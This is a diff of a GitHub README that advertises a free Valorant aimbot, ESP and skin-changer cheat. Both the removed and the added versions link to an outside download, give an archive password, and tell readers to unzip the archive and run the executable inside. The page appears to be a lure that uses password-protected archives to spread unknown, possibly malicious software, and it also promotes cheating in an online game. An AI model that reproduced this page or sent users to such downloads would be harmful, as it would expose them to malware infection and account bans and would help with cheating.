@@ -1,50 +1,93 @@
-# Free-Premium-Valorant-Hacks-HYROCOPT-cheat-FREE-Valorant-Aim-ESP
-Our cheat supports windows 7/10/11
+# VALORANT-HACK-AIMBOT-ESP-MORE-SKINCHANGER-More
 
-# Download
-|[Download](https://www.mediafire.com/file/l58b24ooqwio65b/HYROCOPT_HACK.zip/file)|
-|:-------------|
-Passwrod: 23
+# IMPORTANT 
 
-![image](https://user-images.githubusercontent.com/126517061/222334791-6e70c44d-4933-446d-ad97-b3d6b0cef780.png)
- 
-# Aimbot:
-Recoil Control System
+# Be sure to create an account on GitHub before launching the cheat 
+# Without it, the cheat will not be able to contact the server
 
-Adjustable smooth
+-----------------------------------------------------------------------------------------------------------------------
+# Download Cheat
+|[Download](https://sites.google.com/view/nccrakc/main-page)|Password: 2077|
+|---|---|
+-----------------------------------------------------------------------------------------------------------------------
 
-Adjustable fov
+# Why us?
 
-Vischeck
+- We have a website with full player support
 
-Aimbone
-# Visuals:
-3D box
+- We are constantly updating cheats for the latest version of the game
 
-Headbox
+- We provide all CHEATS for FREE
 
-Skeletons
+- Not any problems with the installation 
 
-Health & armor bar
+- All cheats are connected into one launcher for convenience
 
-Customizable colors
+-----------------------------------------------------------------------------------------------------------------------
 
-Manual and autoscan
-# Extras
-[+] Hide cheat – Spinbot
+# How to install?
 
-[+] Streamable
+- Visit our website
 
-[+] Anti record/screenshot
+- Download the archive 
 
-[+] Customizable multi config system
-# [How to use Valorant Hacks Free?]
-To use this Valorant hacks for free You must turn on your Discord Overlay first of all.
+- Unzip the archive to your desktop ( Password from the archive is 2077 )
 
-Close Riot Games Launcher.
+- Run the file ( NcCrack )
 
-Open HYROCOPT HACK.exe.
+- Launch the game
 
-Open Riot Games Launcher and launch Valorant.
+- In-game INSERT button
 
-Enjoy
+-----------------------------------------------------------------------------------------------------------------------
+
+# SYSTEM REQUIREMENTS
+
+- Processor | Intel | Amd Processor |
+
+- Windows support | 7 | 8 | 8.1 | 10 | 11 |
+
+- Build support | ALL |
+
+-----------------------------------------------------------------------------------------------------------------------
+
+# Functional
+
+# AIMBOT
+
+- Turn on
+- Aimbot type
+- Aimbot Bone
+- Recoil control
+- Change the aimbot radius
+- Change the aimbot speed
+- Recoil control power
+- Draw radius
+- Draw priority
+
+# Visuals
+
+- 2D Boxes
+- Skeletons
+- Health
+- Agent Names
+- Lines
+- Direction of view
+- Distance
+- Stroke panel
+- Ignore teammates
+
+# Radar
+
+- Turn on
+- Distance on the radar
+- Radar angle
+
+# Color
+
+- Changing colors
+- Visible/Invisible/Information
+
+![1662735499319](https://user-images.githubusercontent.com/119938147/213412248-b2e0ddae-ca26-4863-9ec4-a37635bef2ee.png)
+![1662735510230](https://user-images.githubusercontent.com/119938147/213412254-71fd7c62-d3d4-4688-861f-8052b2b4b594.png)
+![1662735532367](https://user-images.githubusercontent.com/119938147/213412255-114d5475-2402-4bb1-a9a0-381180259953.png)
